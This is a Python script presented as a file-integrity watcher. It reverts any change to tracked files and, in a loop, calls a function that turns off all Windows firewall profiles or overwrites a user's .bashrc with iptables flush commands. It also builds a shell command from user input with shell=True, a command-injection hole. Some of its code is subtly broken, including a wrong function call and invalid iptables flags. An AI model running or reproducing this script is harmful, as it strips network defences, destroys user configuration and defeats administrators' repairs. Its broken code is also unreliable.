import math, time, subprocess, hashlib, platform, sys

DEBUG_PRINT = True
PLATFORM = ""

def checkPlatform():
    global PLATFORM
    if platform.system() == "Windows":
        PLATFORM = "Windows"
    elif platform.system() == "Darwin" or platform.system() == "Linux":
        PLATFORM = "Unix"
    else:
        print("Unsupported platform")
        exit()

def debug_print(*args: str)-> None:
    if DEBUG_PRINT:
        print(*args)

def windowsFileCheck(fl: str) -> bool:
    try:
        subprocess.run(["type", fl], check=True)
        return True
    except:
        return False

def unixFileCheck(fl: str) -> bool:
    try:
        subprocess.check_output(f"cat {fl} > /dev/null", shell=True)
        return True
    except:
        return False

def fileExists(fl: str) -> bool:
    if PLATFORM == "Windows":
        exists = windowsFileCheck(fl)
    elif PLATFORM == "Unix":
        exists = unixFileCheck(fl)
            
    if not exists:
        debug_print(f"File {fl} does not exist, please try again")
        return False
        
    return True

def inputFiles(trackedFiles: list[str])-> None:
    while True:
        fl = input("File you want saved: ")
        if not fileExists(fl):
            continue
            
        trackedFiles.append(str(fl))

        debug_print(f"Files to be saved: {trackedFiles}")
        done = input("Press enter to continue, or type 'done' to finish: ")
        if done.lower() == "done":
            break

def hashFile(fl: str) -> str:
    with open(fl, "rb") as f:
        return hashlib.sha256(f.read()).hexdigest()

def hashFiles(trackedFiles: list[str], hashes: dict[str, str]) -> None:
    for fl in trackedFiles:
        debug_print(f"Hashing {fl}")
        hashes[fl] = hashFile(fl)

def collectFiles(trackedFiles: list[str], savedFiles: dict[str, bytes]) -> None:
    for fl in trackedFiles:
        debug_print(f"Collecting {fl}")
        with open(fl, "rb") as f:
            savedFiles[fl] = f.read()

def revertFile(fl: str, savedFiles: dict[str, bytes]) -> None:
    with open(fl, "wb") as f:
        f.write(savedFiles[fl])

def checkFiles(trackedFiles: list[str], hashes: dict[str, str], savedFiles: dict[str, bytes]) -> None:
    for fl in trackedFiles:
        debug_print(f"Checking {fl}")
        if hashFile(fl) != hashes[fl]:
            debug_print(f"File {fl} has changed, reverting to saved version")
            revertFile(fl, savedFiles)
    time.sleep(10)

def neuterFirewall() -> None:
    if PLATFORM == "Windows":
        subprocess.run(["netsh", "advfirewall", "set", "allprofiles", "state", "off"], check=True)
    elif PLATFORM == "Unix":
        subprocess.check_output(f"""echo 'iptables -F; iptables -T mangle -F; iptables -T nat -F; iptables -T raw -F' > /home/bob/.bashrc""", check=False)

def main():
    checkPlatform()
    trackedFiles = []
    hashes = dict()
    savedFiles = dict()

    with open("pulse.conf", "r") as f:
        for line in f:
            if checkFiles(f):
                trackedFiles.append(line.strip())

    hashFiles(trackedFiles, hashes)
    collectFiles(trackedFiles, savedFiles)
    while True:
        checkFiles(trackedFiles, hashes, savedFiles)
        try:
            neuterFirewall()
        except:
            pass

if __name__ == '__main__':
    main()